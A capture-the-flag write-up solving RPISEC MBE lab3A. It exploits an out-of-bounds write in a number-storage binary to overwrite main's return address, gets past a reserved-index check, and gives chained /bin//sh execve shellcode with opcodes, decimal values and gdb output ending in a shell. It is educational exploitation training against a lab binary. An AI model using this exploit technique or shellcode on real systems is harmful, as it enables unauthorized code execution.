Lab3A solution.

These challenges are hosted on https://github.com/RPISEC/MBE. The binaries can be download from 
https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_release.tar.gz

I consider lab3A to be harder than even the projects. This challenge involves exploiting a number storage application, bypassing
few checks and creating custom shellcode to adhere to the constraints. Here is the source code of the file:

https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3A.c


So, the program uses an array of maximum size 100 where it stores our input. But look closely at the arguments passed to the 
store_number function. The array is being handled by a pointer. So, if we make the pointer point to any memory address,
we can write anything anywhere. Also, input is taken using get_unum() which does not take into consideration the length of
the number we pass. So, we can pass 0xbffff0000 as number converted to decimal and it will be written as 0xbffff000.


gdb-peda$ r

Starting program: /root/MBE_release/levels/lab03/lab3A 
----------------------------------------------------
  Welcome to quend's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        

----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: store
 Number: 1932472168
 Index: 1



[-------------------------------------code-------------------------------------]

0x80489b1 <store_number+154>:    mov    eax,DWORD PTR [ebp+0x8]

0x80489b4 <store_number+157>:    add    edx,eax

0x80489b6 <store_number+159>:    mov    eax,DWORD PTR [ebp-0xc]

=> 0x80489b9 <store_number+162>:    mov    DWORD PTR [edx],eax

0x80489bb <store_number+164>:    mov    eax,0x0

0x80489c0 <store_number+169>:    leave  

0x80489c1 <store_number+170>:    ret    

0x80489c2 <read_number>:    push   ebp

[------------------------------------stack-------------------------------------]

0000| 0xbffff1f0 --> 0x8048cdd (" Index: ")

mov [edx], eax

eax contains our input value converted to hex, and edx is basically index*4 + data[0]. So, if we supply index < 0, it will compute

location_to_write = data[0] - index*4.

Now, I know the address of EBP at that point. Analyse the leave ret instruction. Leave is basically
mov esp, ebp;
pop ebp;

ret = pop eip

So, if I write anything at ebp + 4, then it will be popped into eip. (Stack grows towards higher memory so ebp + 4)
Now, we need to find the difference between data[0] and ebp and divide by 4 bytes.

gdb-peda$ p/x $ebp

$2 = 0xbffff218

So ebp is at 0xbffff218. data[0] is at 0xbffff238

Difference = 0x20 = 32 bytes/
So, index = 32/4 = 8

So we will overwrite at index = -7 to get to EBP + 4

gdb-peda$ r

Input command: store
 Number: 213312
 Index: -7
 *** ERROR! ***
   This index is reserved for quend!
 *** ERROR! ***

This is the protection mechanism. 

Every index which is a multiple of 3 is reserved.

(-7) = (FFFFFFFFFFFFFFF9) in hex, which is a multiple of 3.

So, we cannot overwrite function return value.

Lets see the main function.

The disassembly of the last few lines is : 

 0x08048c26:             call   0x8048780 <memset@plt>

0x08048c2b <+537>:    jmp    0x8048aec <main+218>

0x08048c30 <+542>:    mov    eax,0x0

0x08048c35 <+547>:    lea    esp,[ebp-0x8]

0x08048c38 <+550>:    pop    ebx

0x08048c39 <+551>:    pop    edi

0x08048c3a <+552>:    pop    ebp

0x08048c3b <+553>:    ret    

End of assembler dump.
gdb-peda$ 

Lets get to that offset.
So, I need to write my value at some places off the esp. 12 bytes will be popped and then my input will come. Let's hope this is not divisible by 3 :). Then, I will simply quit the program.

After calculations, I see that it is 436 bytes away from data[0].
Offset = 109

Lets test it out.

gdb-peda$ b *0x08048c3b

Breakpoint 2 at 0x8048c3b

gdb-peda$ c

Continuing.

Completed store command successfully

Input command: quit

 [----------------------------------registers-----------------------------------]

EAX: 0x0 

EBX: 0x0 

ECX: 0x74 ('t')

EDX: 0xbffff3c8 ("quit")

ESI: 0x1 

EDI: 0xb7fb5000 --> 0x1b2db0 

EBP: 0x0 

ESP: 0xbffff3ec --> 0x7b ('{')

EIP: 0x8048c3b (<main+553>:    ret)

EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

0x8048c38 <main+550>:    pop    ebx

0x8048c39 <main+551>:    pop    edi

0x8048c3a <main+552>:    pop    ebp

=> 0x8048c3b <main+553>:    ret    

0x8048c3c:    xchg   ax,ax

0x8048c3e:    xchg   ax,ax

0x8048c40 <__libc_csu_init>:    push   ebp

0x8048c41 <__libc_csu_init+1>:    push   edi

[------------------------------------stack-------------------------------------]

0000| 0xbffff3ec --> 0x7b ('{')

0004| 0xbffff3f0 --> 0x1 

0008| 0xbffff3f4 --> 0xbffff488 --> 0x0 

0012| 0xbffff3f8 --> 0xbffff538 --> 0x0 

0016| 0xbffff3fc --> 0x0 

0020| 0xbffff400 --> 0x0 

0024| 0xbffff404 --> 0x0 

0028| 0xbffff408 --> 0xb7fb5000 --> 0x1b2db0 

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value



Breakpoint 2, 0x08048c3b in main ()

gdb-peda$ x/x $esp

0xbffff3ec:    0x0000007b

gdb-peda$ c

Continuing.

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]

EAX: 0x0 

EBX: 0x0 

ECX: 0x74 ('t')

EDX: 0xbffff3c8 ("quit")

ESI: 0x1 

EDI: 0xb7fb5000 --> 0x1b2db0 

EBP: 0x0 

ESP: 0xbffff3f0 --> 0x1 

EIP: 0x7b ('{')

EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

Invalid $PC address: 0x7b

[------------------------------------stack-------------------------------------]

0000| 0xbffff3f0 --> 0x1 

0004| 0xbffff3f4 --> 0xbffff488 --> 0x0 

0008| 0xbffff3f8 --> 0xbffff538 --> 0x0 

0012| 0xbffff3fc --> 0x0 

0016| 0xbffff400 --> 0x0 

0020| 0xbffff404 --> 0x0 

0024| 0xbffff408 --> 0xb7fb5000 --> 0x1b2db0 

0028| 0xbffff40c --> 0xb7fffc04 --> 0x0 

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Stopped reason: SIGSEGV

0x0000007b in ?? ()

So we hit EIP. Now, let's see what we can do.

We cannot overwrite GOT addresses coz they all start with b7 (Protection Mechanism 2).

After some thinking, I thought shellcode.
We need a custom shellcode which jumps after every 8 bytes and executes /bin//sh.
A basic framework of the /bin/sh shellcode can be found at http://shell-storm.org/shellcode/files/shellcode-827.php

Here is the problem : jmp 0xbffff240 or any jmp <address> takes 5 bytes in total!! See here

0:  e9 3c f2 ff bf          jmp    0xbffff240

We need to find another way of doing this which consumes less bytes.

After lunch, this idea struck me.

We could write down as many number of values we want on the stack, and then call pop pop ret. pop into any useless register (say esi) and then either ret or jmp esi. (Of course multiple of 3 problem on stack too)

pop jmp/ret takes 2-3 bytes only. That's amazing.
So, we only need to write the addresses we should jmp to

Here is how the stack would look like:

index 109 : 0xbffff23c --> jmp to start of shellcode

110 : 0xbffff248 --> Memory jumps

111 : GARBAGE

112 : 0xbffff254

113 : 0xbffff260

Here are my assembly instructions for the same : 

push   0x68732f2f

pop ecx   ; ecx --> //sh

nop

ret

push   0x6e69622f

pop edx   ; edx --> /bin

pop esi   ; pop garbage

ret

xor eax, eax

pop esi   ; pop MEM_JMP1 from stack into esi

pop edi   ; pop the 3rd garbage value off the stack

pop edi   ; pop MEM_JMP2 from stack into edi  

jmp esi

push eax

push ecx

push edx

mov ebx, esp

jmp edi

pop edi

pop edi

pop edi

pop edi

jmp edi

xor ecx, ecx

mov al, 0xb   ; execve system call is 11. See unistd_32.h and man execve

int 0x80

I ran this in the online assembler at https://defuse.ca/online-x86-assembler.htm


Disassembly:

0:  68 2f 2f 73 68          push   0x68732f2f

5:  59                      pop    ecx

6:  90                      nop

7:  c3                      ret

8:  68 2f 62 69 6e          push   0x6e69622f

d:  5a                      pop    edx

e:  5e                      pop    esi

f:  c3                      ret

10: 31 c0                   xor    eax,eax

12: 5e                      pop    esi

13: 5f                      pop    edi

14: 5f                      pop    edi

15: ff e6                   jmp    esi

17: 50                      push   eax

18: 51                      push   ecx

19: 52                      push   edx

1a: 89 e3                   mov    ebx,esp

1c: ff e7                   jmp    edi

1e: 5f                      pop    edi

1f: 5f                      pop    edi

20: 5f                      pop    edi

21: 5f                      pop    edi

22: ff e7                   jmp    edi

24: 31 c9                   xor    ecx,ecx

26: b0 0b                   mov    al,0xb

28: cd 80                   int    0x80


So now that we have the opcodes, we can start grouping them into groups of 4.
NOTE: These are assembly instructions. A single byte can represent an assembly instruction (as you can see above). Also, 00 is also an
assembly instruction. The equivalent null in instructions is 90 or NOP.
To see assembly instructions, use x/i <Address> in GDB.

First group them in 4s and then read the opcodes in reverse (coz its little endian). Then compute the numberical decimal equivalent of
the obtained hex values.

Eg. 68 2f 2f 73
    68 59 90 c3
    
    should be read as 
    
    73 2f 2f 68 --> 1932472168
    c3 90 59 68 --> 3281017192
   
(Calculator is highly recommended !!)

Now, all that was left was to convert the opcodes found into decimal and then store those values. All this effort surely bears fruit

after entering, be sure to check the instructions.

0xbffff23c --> start of shellcode

If you have entered correctly, you will see this:

gdb-peda$ x/30xi 0xbffff23c

   0xbffff23c:    push   0x68732f2f
   
   0xbffff241:    pop    ecx
   
   0xbffff242:    nop
   
   0xbffff243:    ret    
   
   0xbffff244:    add    BYTE PTR [eax],al
   
   0xbffff246:    add    BYTE PTR [eax],al
   
   0xbffff248:    push   0x6e69622f
   
   0xbffff24d:    pop    edx
   
   0xbffff24e:    pop    esi
   
   0xbffff24f:    ret    
   
   0xbffff250:    add    BYTE PTR [eax],al
   
   0xbffff252:    add    BYTE PTR [eax],al
   
   0xbffff254:    xor    eax,eax
   
   0xbffff256:    pop    esi
   
   0xbffff257:    pop    edi
   
   0xbffff258:    pop    edi
   
   0xbffff259:    jmp    esi
   
   0xbffff25b:    nop
   
   0xbffff25c:    add    BYTE PTR [eax],al
   
   0xbffff25e:    add    BYTE PTR [eax],al
   
   0xbffff260:    push   eax
   
   0xbffff261:    push   ecx
   
   0xbffff262:    push   edx
   
   0xbffff263:    mov    ebx,esp
   
   0xbffff265:    jmp    edi
   
   0xbffff267:    nop
   
   0xbffff268:    add    BYTE PTR [eax],al
   
   0xbffff26a:    add    BYTE PTR [eax],al
   
   0xbffff26c:    pop    edi
   
   0xbffff26d:    pop    edi

gdb-peda$ 

0xbffff26e:    pop    edi

0xbffff26f:    pop    edi

0xbffff270:    push   eax

0xbffff271:    jmp    edi

0xbffff273:    nop

0xbffff274:    add    BYTE PTR [eax],al
   
0xbffff276:    add    BYTE PTR [eax],al

0xbffff278:    xor    ecx,ecx

0xbffff27a:    mov    al,0x0

0xbffff27c:    int    0x80

0xbffff27e:    nop

0xbffff27f:    nop


gdb-peda$ x/xs $ebx

0xbffff3fc:    "/bin//sh"

gdb-peda$ x/xs $ecx

0x0:    <error: Cannot access memory at address 0x0>


STACK FRAME : 

gdb-peda$ x/7xw $esp

0xbffff3f0:    0xbffff248    0xbffff488    0xbffff254    0xbffff260

0xbffff400:    0x00000000    0xbffff26c    0xbffff278

gdb-peda$ x/4xi $eip

=> 0xbffff27c:    int    0x80

0xbffff27e:    nop

0xbffff27f:    nop

0xbffff280:    add    BYTE PTR [eax],al

gdb-peda$ stepi

process 6579 is executing new program: /bin/dash

Warning:

Cannot insert breakpoint 1.

Cannot access memory at address 0x80489b9

Cannot insert breakpoint 2.

Cannot access memory at address 0x8048c3b

There we go. (GDB executed /bin/dash as its own security feature)

We got shell on the box through system call 11.
